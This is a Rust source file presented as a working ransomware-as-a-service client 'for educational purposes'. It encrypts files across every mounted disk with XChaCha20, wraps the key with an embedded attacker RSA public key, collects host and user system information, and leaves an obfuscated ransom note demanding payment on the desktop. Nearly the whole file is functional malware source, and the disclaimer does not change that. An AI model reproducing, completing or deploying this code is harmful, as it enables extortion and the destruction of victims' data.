// I AM NOT RESPONSIBLE FOR ANYTHING YOU ARE DOING WITH THIS CODE
// This is a working example of the "client" that could be used for a RaaS (Ransomware as a Service)
// However, this was written just as an exercise and for educational purposes, do NOT use this for any illegal activity!

extern crate core;

use std::borrow::BorrowMut;
use sysinfo::{DiskExt, System, SystemExt};
use std::{env, fs};
use std::collections::HashSet;
use std::fs::File;
use walkdir::WalkDir;
use std::io::{Read, Write};
use std::path::{Path, PathBuf};
use zeroize::{ZeroizeOnDrop, Zeroize};
use anyhow::{anyhow, Error};
use chacha20poly1305::aead::rand_core::RngCore;
use chacha20poly1305::aead::stream;
use chacha20poly1305::{XChaCha20Poly1305, KeyInit, aead::Aead};
use rand::rngs::OsRng;
use serde::{Deserialize, Serialize};
use rayon::prelude::*;
use rsa::pkcs8::DecodePublicKey;
use rsa::{RsaPublicKey, Oaep};
use directories::UserDirs;
use lazy_static::lazy_static;
use uuid::Uuid;
use konst::{
    unwrap_ctx,
    parsing::{Parser},
};

// TODO: Separate this code into multiple files and clean it

//https://github.com/danburkert/memmap-rs
//this can be used to get a little more performance technically, needs benchmarks

// What this does
// Generates a random key securely locally
// Use key to encrypt everything
// Use owner's public key to encrypt the victim's symmetric key
// Store the encrypted data

static PUB_KEY: &str = include_str!("../pub.key");
static HACKER_UUID: &str = env!("UUID");
static PRICE: u64 = unwrap_ctx!(Parser::parse_u64(Parser::new(env!("PRICE")))).0;
static KEY_NAME: &str = "key.part1";
static INFO_NAME: &str = "key.part2";

lazy_static!{
    static ref EXTENSIONS: HashSet<&'static str> = HashSet::from(["txt", "png", "jpeg", "jpg"]);
}

#[derive(Debug, Serialize, Deserialize, ZeroizeOnDrop)]
pub struct Output {
    pub victim: String, // Victim's id, randomly generated on infection
    pub hacker: String, // Hacker's id, "hardcoded" at compile time
    // Here you can add the target, price etc
    pub message: String,
    pub price: u64, // price in USD
    system_info: SysInfo,
}

impl Output {
    fn new(message: String, price: u64, victim: String, hacker: String) -> Self {
        Output {
            message,
            price,
            system_info: SysInfo::new(),
            victim,
            hacker,
        }
    }

    fn get_files(&self, pub_key: &str, key: &[u8; 32]) -> Result<(Vec<u8>, Vec<u8>), Error> {
        let rsa_key = RsaPublicKey::from_public_key_pem(pub_key)?;
        let padding = Oaep::new::<sha2::Sha256>();
        //This is the PGP Encrypted AES key
        let aes_key = rsa_key.encrypt(OsRng.borrow_mut(), padding, key)?;


        let mut json = serde_json::to_string(&self).unwrap(); //TODO Check if this has a chance to fail and find some way to handle
        let mut nonce = [0u8; 24];
        OsRng.fill_bytes(&mut nonce);
        let mut data = encrypt_bytes(json.as_bytes(), key, &nonce)?;

        // Clear unencrypted data from memory
        json.zeroize();
        let mut data_buff = Vec::from(nonce);
        data_buff.append(&mut data);
        Ok((aes_key, data_buff))
    }
}

#[derive(Serialize, Deserialize, Debug, Zeroize)]
struct SysInfo {
    disks: String,
    all_memory: u64,
    boot_time: u64,
    cpus: String,
    distribution_id: String,
    cpu_info: String,
    host_name: Option<String>,
    kernel_version: Option<String>,
    os_version: Option<String>,
    name: Option<String>,
    networks: String,
    core_count: Option<usize>,
    swap_size: u64,
    uptime: u64,
    users: String,
}

impl SysInfo {
    fn new() -> Self {
        let sys = System::new_all();
        SysInfo {
            disks: format!("{:?}", sys.disks()),
            all_memory: sys.available_memory(),
            boot_time: sys.boot_time(),
            cpus: format!("{:?}", sys.cpus()),
            distribution_id: sys.distribution_id(),
            cpu_info: format!("{:?}", sys.global_cpu_info()),
            host_name: sys.host_name(),
            kernel_version: sys.kernel_version(),
            os_version: sys.long_os_version(),
            name: sys.name(),
            networks: format!("{:?}", sys.networks()),
            core_count: sys.physical_core_count(),
            swap_size: sys.total_swap(),
            uptime: sys.uptime(),
            users: format!("{:?}", sys.users()), // if there is no internet, generate the key and print it in the terminal, or use clap to select the options

        }
    }
}

fn decrypt_everything(key: &[u8; 32]) {
    let sys = System::new_all();
    sys.disks().par_iter().for_each(|disk| {
        let mut enc = Encrypter::new();
        let mut nonce = [0u8; 19];
        for entry in WalkDir::new(disk.mount_point()).into_iter().filter_map(|e| e.ok()) {
            if let Some(extension) = &entry.path().extension() {
                if !EXTENSIONS.contains(extension.to_str().unwrap()) {
                    OsRng.fill_bytes(&mut nonce);
                    match enc.decrypt_file(entry.path(), &entry.path().join(".enc"), key) {
                        Ok(_) => { println!("Decrypted file {:?} with success", entry.path())}
                        Err(e) => { eprintln!("Error {} decrypting file {:?}", e, entry.path()); }
                    }
                }
            }
        }
    });
}

fn encrypt_everything(key: &[u8; 32]) {
    let sys = System::new_all();
    sys.disks().par_iter().for_each(|disk| {
        let mut enc = Encrypter::new();
        let mut nonce = [0u8; 19];
        for entry in WalkDir::new(disk.mount_point()).into_iter().filter_map(|e| e.ok()) {
            if let Some(extension) = &entry.path().extension() {
                if !EXTENSIONS.contains(extension.to_str().unwrap()) {
                    OsRng.fill_bytes(&mut nonce);
                    match enc.encrypt_file(entry.path(), &entry.path().join(".enc"), key, &nonce) {
                        Ok(_) => {}
                        // Err(e) => { eprintln!("Error {} encrypting file {:?}", e, entry.path()); }
                        Err(_) => { }
                    }
                }
            }
        }
    });
}

fn main() {
    let args = env::args().collect::<Vec<String>>();
    if args.len() > 1 && args[1] == "decrypt" {
        let mut key = [0u8; 32];
        let mut file = File::open("decryption.key").expect("Cannot read keyfile (file must be named decryption.key)");
        file.read_exact(&mut key).expect("Cannot read key");
        decrypt_everything(&key);
    } else {
        let mut key = [0u8; 32];
        OsRng.fill_bytes(&mut key);
        encrypt_everything(&key);

        let output = Output::new(obfstr::obfstr!("Crazy msg goes here").to_string(), PRICE, Uuid::new_v4().to_string(), HACKER_UUID.to_owned());
        let res = output.get_files(PUB_KEY, &key).unwrap();
        key.zeroize();
        drop(output);

        let ud = UserDirs::new();
        let msg_path = get_path("READ_ME.txt", &ud);
        let key_path = get_path(KEY_NAME, &ud);
        let info_path = get_path(INFO_NAME, &ud);

        fs::write(msg_path, format!("U gotta pay like {} USD", PRICE)).unwrap();
        fs::write(key_path, res.0).unwrap();
        fs::write(info_path, res.1).unwrap();
    }
}


fn get_path(filename: &str, ud: &Option<UserDirs>) -> PathBuf {
    match ud {
        None => { Path::new(filename).to_path_buf()}
        Some(m) => {
            if let Some(m) = m.desktop_dir() {
                m.join(filename)
            } else {
                Path::new(filename).to_path_buf()
            }
        }
    }
}

#[derive(ZeroizeOnDrop)]
struct Encrypter {
    buffer_len: usize,
    buffer: Vec<u8>,
    dec_buffer_len: usize,
    dec_buffer: Vec<u8>,
}

impl Encrypter {
    fn new() -> Self {
        let buffer_len = 1_000_000;
        let dec_buffer_len = buffer_len + 16;
        Encrypter {
            buffer_len,
            buffer: vec![0; buffer_len], // 1MB seems to be faster than 5
            dec_buffer_len,
            dec_buffer: vec![0; dec_buffer_len],
        }
    }

    fn encrypt_file(&mut self, source_file_path: &Path, dist_file_path: &Path, key: &[u8; 32], nonce: &[u8; 19], )
        -> Result<(), Error> {
        let aead = XChaCha20Poly1305::new(key.as_ref().into());
        let mut stream_encryptor = stream::EncryptorBE32::from_aead(aead, nonce.as_ref().into());

        let mut source_file = File::open(source_file_path)?;
        let mut dist_file = File::create(dist_file_path)?;
        dist_file.write(nonce)?;
        loop {
            let read_count = source_file.read(&mut self.buffer[..])?;

            if read_count == self.buffer_len {
                let ciphertext = stream_encryptor
                    .encrypt_next(self.buffer.as_slice())
                    .map_err(|err| anyhow!("Encrypting large file: {}", err))?;
                dist_file.write(&ciphertext)?;
            } else {
                let ciphertext = stream_encryptor
                    .encrypt_last(&self.buffer[..read_count])
                    .map_err(|err| anyhow!("Encrypting large file: {}", err))?;
                dist_file.write(&ciphertext)?;
                break;
            }
        }

        Ok(())
    }

    fn decrypt_file(&mut self, encrypted_file_path: &Path, dist: &Path, key: &[u8; 32])
        -> Result<(), Error> {
        let aead = XChaCha20Poly1305::new(key.as_ref().into());
        let mut encrypted_file = File::open(encrypted_file_path)?;
        let mut dist_file = File::create(dist)?;
        let mut nonce: [u8; 19] = [0; 19];

        encrypted_file.read_exact(&mut nonce)?;
        let mut stream_decryptor = stream::DecryptorBE32::from_aead(aead, nonce.as_ref().into());

        loop {
            let read_count = encrypted_file.read(&mut self.dec_buffer[..])?;

            if read_count == self.dec_buffer_len {
                let plaintext = stream_decryptor
                    .decrypt_next(self.dec_buffer.as_slice())
                    .map_err(|err| anyhow!("Decrypting large file: {}", err))?;
                dist_file.write(&plaintext)?;
            } else if read_count == 0 {
                break;
            } else {
                let plaintext = stream_decryptor
                    .decrypt_last(&self.dec_buffer[..read_count])
                    .map_err(|err| anyhow!("Decrypting large file: {}", err))?;
                dist_file.write(&plaintext)?;
                break;
            }
        }

        Ok(())
    }
}

fn encrypt_bytes(data: &[u8], key: &[u8; 32], nonce: &[u8; 24]) -> Result<Vec<u8>, Error> {
    let cipher = XChaCha20Poly1305::new(key.into());

    let mut encrypted = cipher
        .encrypt(nonce.into(), data)
        .map_err(|err| anyhow!("Encrypting bytes: {}", err))?;
    let mut v = Vec::from(nonce.as_slice());
    v.append(&mut encrypted);
    Ok(v)
}